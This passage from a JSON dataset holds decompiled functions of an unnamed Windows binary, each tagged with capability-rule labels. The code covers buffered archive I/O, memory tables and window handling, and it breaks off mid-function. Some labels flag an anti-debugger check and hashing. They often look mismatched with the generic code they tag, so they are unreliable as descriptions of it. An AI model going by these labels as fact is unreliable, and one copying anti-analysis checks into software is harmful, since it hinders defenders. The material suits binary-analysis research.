        "decompiled_code": "\nvoid __fastcall fcn.00429b78(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(param_1 + 0x28);\n    if ((*(param_1 + 0x18) & 1) == 0) {\n        piVar1 = param_1 + 0x30;\n        iVar2 = *piVar1;\n        if (*(param_1 + 8) == 0) {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x38))(iVar2, iVar3 - iVar2);\n            }\n        }\n        else {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x50))(2, iVar3 - iVar2, 0, 0);\n            }\n            (**(**(param_1 + 0x24) + 0x50))(1, *(param_1 + 0x20), piVar1, param_1 + 0x2c);\n        }\n        iVar3 = *piVar1;\n    }\n    else {\n        if (*(param_1 + 0x2c) != iVar3) {\n            iVar3 = iVar3 - *(param_1 + 0x2c);\n            (**(**(param_1 + 0x24) + 0x28))(iVar3, iVar3 >> 0x1f, 1);\n        }\n        iVar3 = *(param_1 + 0x2c);\n    }\n    *(param_1 + 0x28) = iVar3;\n    return;\n}\n",
        "token_count": 376
    },
    "00429bef": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429bef(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint arg_8h_00;\n    int32_t in_stack_ffffffe4;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar6 = in_ECX;\n    if ((*(in_ECX + 0x18) & 1) != 0) goto code_r0x00429c09;\n    arg_8h_00 = 4;\n    in_stack_ffffffe4 = *(in_ECX + 0x14);\n    do {\n        fcn.004299a5(arg_8h_00, in_stack_ffffffe4);\n        iVar6 = in_ECX;\ncode_r0x00429c09:\n        in_ECX = in_stack_ffffffe4;\n        uVar2 = *(iVar6 + 0x28);\n        piVar1 = iVar6 + 0x2c;\n        var_4h = *piVar1 - uVar2;\n        uVar3 = arg_8h + var_4h;\n        if (*(iVar6 + 8) == 0) {\n            uVar4 = *(iVar6 + 0x30);\n            if (uVar4 < uVar2) {\n                if (0 < var_4h) {\n                    fcn.00429a2a(uVar4, *piVar1 - uVar4, uVar2, var_4h);\n                    uVar4 = *(iVar6 + 0x30);\n                    *(iVar6 + 0x28) = uVar4;\n                    *piVar1 = uVar4 + var_4h;\n                }\n                if (*(iVar6 + 0xc) == 0) {\n                    arg_8h = *(iVar6 + 0x20);\n                }\n                arg_8h = arg_8h - var_4h;\n                iVar7 = var_4h + uVar4;\n                do {\n                    iVar5 = (**(**(iVar6 + 0x24) + 0x34))(iVar7, arg_8h);\n                    var_4h = var_4h + iVar5;\n                    arg_8h = arg_8h - iVar5;\n                    iVar7 = iVar7 + iVar5;\n                    if ((iVar5 == 0) || (arg_8h == 0)) break;\n                } while (var_4h < uVar3);\n                *(iVar6 + 0x28) = *(iVar6 + 0x30);\n                *piVar1 = *(iVar6 + 0x30) + var_4h;\n            }\n        }\n        else {\n            if (var_4h != 0) {\n                (**(**(iVar6 + 0x24) + 0x28))(-var_4h, -var_4h >> 0x1f, 1);\n            }\n            (**(**(iVar6 + 0x24) + 0x50))(0, *(iVar6 + 0x20), iVar6 + 0x30, piVar1);\n            *(iVar6 + 0x28) = *(iVar6 + 0x30);\n        }\n        if (uVar3 <= *piVar1 - *(iVar6 + 0x28)) {\n            return;\n        }\n        arg_8h_00 = 3;\n        in_stack_ffffffe4 = in_ECX;\n    } while( true );\n}\n",
        "token_count": 812
    },
    "00429cdf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00429cdf(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uchar unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 1;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00429b78();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    return param_1;\n}\n",
        "token_count": 195
    },
    "00429d15": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00429d15(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(2, *(param_1 + 0x14));\n    }\n    uVar2 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar2 && uVar2 != *(param_1 + 0x2c)) {\n        fcn.00429b78();\n    }\n    puVar1 = *(param_1 + 0x28);\n    *puVar1 = unaff_ESI;\n    puVar1[1] = unaff_retaddr;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 233
    },
    "00429d55": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00429d55(int32_t param_1)\n\n{\n    uchar *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 1U) {\n        fcn.00429bef((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 1);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "00429d94": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00429d94(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.00429bef((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    puVar1 = *(param_1 + 0x28);\n    *unaff_ESI = *puVar1;\n    unaff_ESI[1] = puVar1[1];\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 223
    },
    "00429fd7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429fd7(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        if ((~*(in_ECX + 0x18) & 1) == 0) {\n            fcn.004299a5(2, *(in_ECX + 0x14));\n        }\n        uVar1 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        uVar2 = arg_ch;\n        if (uVar1 <= arg_ch) {\n            uVar2 = uVar1;\n        }\n        fcn.0041314e(*(in_ECX + 0x28), uVar1, arg_8h, uVar2);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar2;\n        arg_ch = arg_ch - uVar2;\n        if (arg_ch != 0) {\n            fcn.00429b78();\n            iVar3 = arg_ch - arg_ch % *(in_ECX + 0x20);\n            (**(**(in_ECX + 0x24) + 0x38))(arg_8h + uVar2, iVar3);\n            arg_ch = arg_ch - iVar3;\n            if (*(in_ECX + 8) != 0) {\n                (**(**(in_ECX + 0x24) + 0x50))(1, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n            }\n            if (arg_ch < *(in_ECX + 0x20)) goto code_r0x0042a07c;\n            do {\n                fcn.00411e42();\ncode_r0x0042a07c:\n            } while (*(in_ECX + 0x28) != *(in_ECX + 0x30));\n            fcn.0041314e(*(in_ECX + 0x28), arg_ch, arg_8h + uVar2 + iVar3, arg_ch);\n            *(in_ECX + 0x28) = *(in_ECX + 0x28) + arg_ch;\n        }\n    }\n    return;\n}\n",
        "token_count": 562
    },
    "0042a2d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0042a2d4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0040f620();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 == NULL) {\n        fcn.00411e42();\n    }\n    uVar2 = (**(*piVar1 + 0x18))(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 1;\n    fcn.0041d369(uVar2);\n    *(unaff_EBP + -4) = 0;\n    fcn.00402740();\n    uVar2 = *(unaff_EBP + 0xc);\n    extraout_ECX[4] = 0xffffffff;\n    extraout_ECX[6] = uVar2;\n    extraout_ECX[1] = 1;\n    extraout_ECX[7] = 1;\n    extraout_ECX[9] = piVar1;\n    extraout_ECX[0x10] = (-((~uVar2 & 1) != 0) & 0xffffffd0) + 0x40;\n    uVar2 = *(unaff_EBP + 0x14);\n    extraout_ECX[0xf] = 0;\n    extraout_ECX[0xe] = 0;\n    *extraout_ECX = 0;\n    extraout_ECX[0x11] = 0x89;\n    extraout_ECX[0xc] = uVar2;\n    extraout_ECX[2] = 0;\n    uVar3 = (**(*piVar1 + 0x50))(3, 0, 0, 0);\n    iVar5 = *(unaff_EBP + 0x10);\n    extraout_ECX[3] = uVar3 & 2;\n    if (iVar5 < 0x80) {\n        extraout_ECX[8] = 0x80;\n        extraout_ECX[0xc] = 0;\n    }\n    else {\n        extraout_ECX[8] = iVar5;\n    }\n    iVar5 = extraout_ECX[8];\n    if (extraout_ECX[0xc] == 0) {\n        uVar3 = (**(*extraout_ECX[9] + 0x50))(3, 0, 0, 0);\n        extraout_ECX[2] = uVar3 & 1;\n        if ((uVar3 & 1) == 0) {\n            uVar2 = fcn.00411579(extraout_ECX[8]);\n            extraout_ECX[0xc] = uVar2;\n            extraout_ECX[7] = 0;\n        }\n        else {\n            iVar5 = 0;\n        }\n    }\n    iVar5 = extraout_ECX[0xc] + iVar5;\n    extraout_ECX[0xb] = iVar5;\n    iVar4 = extraout_ECX[0xc];\n    if ((*(extraout_ECX + 6) & 1) != 0) {\n        iVar4 = iVar5;\n    }\n    extraout_ECX[10] = iVar4;\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 865
    },
    "00430a87": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00430a87(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    iStack24 = param_1 + 0x1c;\n    iStack28 = 0x430a9c;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    iVar3 = *(param_1 + 4);\n    iVar7 = *(param_1 + 8);\n    if ((iVar3 <= iVar7) || ((*(*(param_1 + 0x10) + iVar7 * 8) & 1) != 0)) {\n        iVar7 = 1;\n        if (1 < iVar3) {\n            puVar6 = *(param_1 + 0x10);\n            do {\n                puVar6 = puVar6 + 8;\n                if ((*puVar6 & 1) == 0) break;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < iVar3);\n            if (iVar7 < iVar3) goto code_r0x00430b6b;\n        }\n        iVar3 = iVar3 + 0x20;\n        iStack28 = *(param_1 + 0x10);\n        if (iStack28 == 0) {\n            iStack28 = 8;\n            iStack36 = 0x430ae7;\n            iStack32 = iVar3;\n            iStack28 = fcn.00402340();\n            iStack32 = 2;\n            iStack36 = 0x430af2;\n            iStack36 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        }\n        else {\n            iStack32 = 0x430afb;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n            iStack36 = 0x430b04;\n            iStack32 = uVar4;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n            iStack36 = 0x2002;\n            iStack40 = 8;\n            iStack44 = iVar3;\n            iStack40 = fcn.00402340();\n            iStack44 = uVar4;\n            iStack36 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)();\n        }\n        if (iStack36 == 0) {\n            iStack36 = *(param_1 + 0x10);\n            if (iStack36 != 0) {\n                iStack40 = 0x430b2d;\n                iStack40 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                iStack44 = 0x430b34;\n                (*_sym.imp.KERNEL32.dll_GlobalLock)();\n            }\n            iStack40 = 0x430b3e;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n            iStack44 = 0x4b6188;\n            iStack40 = iVar3;\n            fcn.0046230a(&stack0xffffffd4, 0x4a75f0);\n            pcVar2 = swi(3);\n            iVar3 = (*pcVar2)();\n            return iVar3;\n        }\n        iStack40 = 0x430b4a;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        iStack28 = (iVar3 - *(param_1 + 4)) * 8;\n        iStack36 = iVar5 + *(param_1 + 4) * 8;\n        iStack32 = 0;\n        iStack40 = 0x430b62;\n        fcn.00462290();\n        *(param_1 + 4) = iVar3;\n        *(param_1 + 0x10) = iVar5;\n    }\ncode_r0x00430b6b:\n    if (*(param_1 + 0xc) <= iVar7) {\n        *(param_1 + 0xc) = iVar7 + 1;\n    }\n    puVar1 = *(param_1 + 0x10) + iVar7 * 8;\n    *puVar1 = *puVar1 | 1;\n    *(param_1 + 8) = iVar7 + 1;\n    iStack32 = 0x430b8f;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n    return iVar7;\n}\n",
        "token_count": 1018
    },
    "00433a58": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433a58(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    int32_t lpRect;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_DefWindowProcA)(*(in_ECX + 0x20), 0x46, 0, arg_8h);\n    if ((*(arg_8h + 0x18) & 1) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x20), &lpRect);\n        var_4h = *(arg_8h + 0x10);\n        var_ch = var_ch - lpRect;\n        var_8h = var_8h - var_10h;\n        iVar1 = *(arg_8h + 0x14);\n        if ((var_4h != var_ch) && ((*(in_ECX + 0x80) & 0x400) != 0)) {\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, var_4h - *0x4bb5e8, 0, var_4h, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), &lpRect, 1);\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, var_ch - *0x4bb5e8, 0, var_ch, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), &lpRect, 1);\n        }\n        pcVar2 = _sym.imp.USER32.dll_SetRect;\n        if ((iVar1 != var_8h) && ((*(in_ECX + 0x80) & 0x800) != 0)) {\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, 0, iVar1 - *0x4bb5ec, var_4h, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), &lpRect, 1);\n            (*pcVar2)(&lpRect, 0, var_8h - *0x4bb5ec, var_4h, var_8h);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), &lpRect, 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 584
    },
    "00433d84": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00433d84(uint noname_0, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    int32_t lprcDst;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    uVar1 = (**(*in_ECX + 0x158))(arg_ch);\n    if (((uVar1 & 0x10000000) != 0) && ((uVar1 & 0xf000) != 0)) {\n        (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, arg_ch + 1);\n        iVar4 = var_14h - lprcDst;\n        iVar3 = var_10h - var_18h;\n        bVar5 = arg_ch[7] != 0;\n        if (((var_4h[0x20] & 4U) == 0) || ((var_4h[0x20] & 1U) == 0)) {\n            if ((uVar1 & 0xa000) == 0) {\n                uVar2 = bVar5 | 0x10;\n            }\n            else {\n                uVar2 = bVar5 | 10;\n            }\n        }\n        else {\n            uVar2 = bVar5 | 6;\n        }\n        (**(*var_4h + 0x138))(&var_ch, 0xffffffff, uVar2);\n        if (iVar4 <= var_ch) {\n            var_ch = iVar4;\n        }\n        if (iVar3 <= var_8h) {\n            var_8h = iVar3;\n        }\n        if ((uVar1 & 0xa000) == 0) {\n            if ((uVar1 & 0x5000) != 0) {\n                arg_ch[5] = arg_ch[5] + var_ch;\n                iVar3 = arg_ch[6];\n                if (arg_ch[6] <= var_8h) {\n                    iVar3 = var_8h;\n                }\n                arg_ch[6] = iVar3;\n                if ((uVar1 & 0x1000) == 0) {\n                    if ((uVar1 & 0x4000) != 0) {\n                        lprcDst = var_14h - var_ch;\n                        arg_ch[3] = arg_ch[3] - var_ch;\n                    }\n                }\n                else {\n                    arg_ch[1] = arg_ch[1] + var_ch;\n                }\n            }\n        }\n        else {\n            arg_ch[6] = arg_ch[6] + var_8h;\n            iVar3 = arg_ch[5];\n            if (arg_ch[5] <= var_ch) {\n                iVar3 = var_ch;\n            }\n            arg_ch[5] = iVar3;\n            if ((uVar1 & 0x2000) == 0) {\n                if (uVar1 < 0) {\n                    var_18h = var_10h - var_8h;\n                    arg_ch[4] = arg_ch[4] - var_8h;\n                }\n            }\n            else {\n                arg_ch[2] = arg_ch[2] + var_8h;\n            }\n        }\n        var_14h = lprcDst + var_ch;\n        var_10h = var_18h + var_8h;\n        if (*arg_ch != 0) {\n            fcn.00416336(arg_ch, var_4h[8], &lprcDst);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 857
    },
    "00438d21": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00438d21(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint lpvBits;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    fcn.0043039f(8);\n    if (*0x4bb674 == 0) {\n        iVar2 = 0;\n        do {\n            uVar1 = iVar2;\n            iVar2 = iVar2 + 1;\n            *(&stack0xffffffe6 + iVar2 * 2) = 0x5555 << (uVar1 & 1);\n        } while (iVar2 < 8);\n        iVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, &lpvBits);\n        if (iVar2 != 0) {\n            *0x4bb674 = (*_sym.imp.GDI32.dll_CreatePatternBrush)(iVar2);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar2);\n        }\n    }\n    if (*0x4bb678 == '\\0') {\n        iVar2 = fcn.0045f38e(0x438b0e);\n        *0x4bb678 = '\\x01' - (iVar2 != 0);\n    }\n    fcn.0043040c(8);\n    iVar2 = *0x4bb674;\n    fcn.0042e42a();\n    fcn.0045e747(iVar2);\n    return;\n}\n",
        "token_count": 341
    },
    "00439294": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00439294(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *in_ECX;\n    uint32_t uVar5;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_30h;\n    \n    iVar1 = fcn.00418521();\n    if (iVar1 != 0) {\n        var_50h = 0x50;\n        var_4ch = 0x11;\n        (**(*in_ECX + 0x110))(0x41d, arg_8h, &var_50h);\n        uVar2 = fcn.004185ec(var_30h);\n        piVar3 = fcn.0042f550(0x4940a8, uVar2);\n        if (piVar3 == NULL) {\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(var_30h, 0xfffffff0);\n            uVar4 = uVar4 >> 0x1c & 1;\n        }\n        else {\n            uVar4 = (**(*piVar3 + 0x154))();\n        }\n        uVar5 = ~(var_48h >> 3) & 1;\n        if (uVar4 != uVar5) {\n            (*_sym.imp.USER32.dll_ShowWindow)(var_30h, -(uVar5 != 0) & 5);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 356
    },
    "0043acdf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043acdf(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(2, *(param_1 + 0x14));\n    }\n    uVar2 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar2 && uVar2 != *(param_1 + 0x2c)) {\n        fcn.00429b78();\n    }\n    puVar1 = *(param_1 + 0x28);\n    *puVar1 = unaff_ESI;\n    puVar1[1] = unaff_retaddr;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 233
    },
    "0043ad1f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043ad1f(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00429b78();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 199
    },
    "0043ad58": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043ad58(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00429b78();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 198
    },
    "0043ad91": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __fastcall fcn.0043ad91(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00429b78();\n    }\n    **(param_1 + 0x28) = CONCAT44(unaff_retaddr, unaff_ESI);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 227
    },
    "0043adca": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043adca(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.00429bef((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    puVar1 = *(param_1 + 0x28);\n    *unaff_ESI = *puVar1;\n    unaff_ESI[1] = puVar1[1];\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 223
    },
    "0043ae12": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043ae12(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.00429bef((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "0043ae54": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043ae54(int32_t param_1)\n\n{\n    ulong *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.00429bef((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "0043ae96": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043ae96(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.00429bef((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "0043b0af": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x0043b171)\n\nvoid __cdecl fcn.0043b0af(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *in_ECX;\n    uint32_t uVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar3 = in_ECX[2];\n    if (uVar3 != 0) {\n        *arg_8h = *in_ECX;\n        arg_8h[1] = in_ECX[1];\n        arg_8h[2] = uVar3;\n        return;\n    }\n    uVar3 = in_ECX[1];\n    uVar5 = *in_ECX;\n    if (((uVar5 | uVar3) == 0) || (arg_ch == 0)) {\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n        return;\n    }\n    uVar1 = arg_ch >> 0x18 ^ uVar3 >> 0x18;\n    if ((uVar3 < 1) && (uVar3 < 0)) {\n        bVar6 = uVar5 != 0;\n        uVar5 = -uVar5;\n        uVar3 = -(uVar3 + bVar6);\n    }\n    uVar4 = fcn.0046415b(arg_ch);\n    uVar7 = fcn.00464420(uVar3, 0, uVar4, 0);\n    if 